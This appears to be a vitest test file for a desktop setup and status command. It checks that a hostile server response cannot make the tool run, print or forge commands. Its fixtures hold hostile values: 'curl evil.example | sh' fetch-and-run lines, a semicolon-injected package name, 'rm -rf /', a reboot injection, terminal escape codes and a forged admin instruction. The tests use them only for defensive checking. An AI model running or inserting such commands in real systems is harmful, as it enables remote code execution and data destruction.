import { describe, expect, it } from "vitest"

import {
  answers,
  aptInstall,
  aptUpdate,
  running,
  status,
  url,
  world
} from "./desktop-test-support.js"
import { desktopSetupCommand, desktopStatusCommand } from "./desktop.js"

const everythingPrinted = (machine: ReturnType<typeof world>) =>
  [...machine.logs, ...machine.errors, ...machine.interactiveCalls].join("\n")

describe("an answer on the server's port that isn't the server's", () => {
  const escape = String.fromCodePoint(27)
  const hostile = {
    ...status({ sudo: "password" }),
    missing: ["Xvnc", "Xvnc; curl evil.example | sh"],
    account: `root${escape}[2J`,
    system: `Ubuntu${escape}]0;owned`,
    install: [["sh", "-c", "curl evil.example | sh"]],
    packageManager: "sh -c 'curl evil.example | sh'",
    oldDesktop: { units: ["x; reboot"], removal: [["rm", "-rf", "/"]] },
    startsAtBoot: false,
    startAtBootHint: "curl evil.example | sudo sh",
    logHint: `journalctl${escape}[31m`
  }

  it("can make an administrator's setup run only the commands the command builds itself", async () => {
    const machine = world({
      [`GET ${url()}`]: answers(hostile, { ...hostile, missing: [] }),
      [`POST ${url("/start")}`]: answers({ ...hostile, state: "running", managed: true })
    })
    expect(await desktopSetupCommand(machine.deps)).toBe(0)
    expect(machine.interactiveCalls).toEqual([`sudo ${aptUpdate}`, `sudo ${aptInstall}`])
    expect(everythingPrinted(machine)).not.toContain("evil.example")
    expect(everythingPrinted(machine)).not.toContain(escape)
    expect(machine.logs.at(-1)).toBe(
      "    It starts at boot once this account lingers: sudo loginctl enable-linger <the server's account>"
    )
  })

  it("can't make root remove anything: an old desktop is only what the machine's own files show", async () => {
    const asRoot = world(
      {
        [`GET ${url()}`]: answers({ ...hostile, missing: [] }),
        [`POST ${url("/start")}`]: answers(running)
      },
      { isRoot: true }
    )
    expect(await desktopSetupCommand(asRoot.deps, { yes: true })).toBe(0)
    expect(asRoot.interactiveCalls).toEqual([])
    expect(asRoot.questions).toEqual([])
  })

  it("can't pass its own lines off as the command's: every further line of its text is marked", async () => {
    const forged =
      "x\nInstalling packages needs an administrator. Ask one to run:\n\tcurl evil.example | sh"
    const machine = world({ [`GET ${url()}`]: [{ status: 500, body: { error: forged } }] })
    expect(await desktopSetupCommand(machine.deps)).toBe(1)
    expect(machine.errors).toEqual([
      "x\n    | Installing packages needs an administrator. Ask one to run:\n    |   curl evil.example | sh"
    ])
  })

  it("can't put its own text in what status prints", async () => {
    const machine = world({ [`GET ${url()}`]: answers({ ...hostile, state: "running" }) })
    expect(await desktopStatusCommand(machine.deps)).toBe(0)
    expect(machine.logs).toEqual([
      "The desktop is running as the server's account.",
      "It starts at boot once this account lingers: sudo loginctl enable-linger <the server's account>",
      "Log: journalctl[31m"
    ])
  })
})
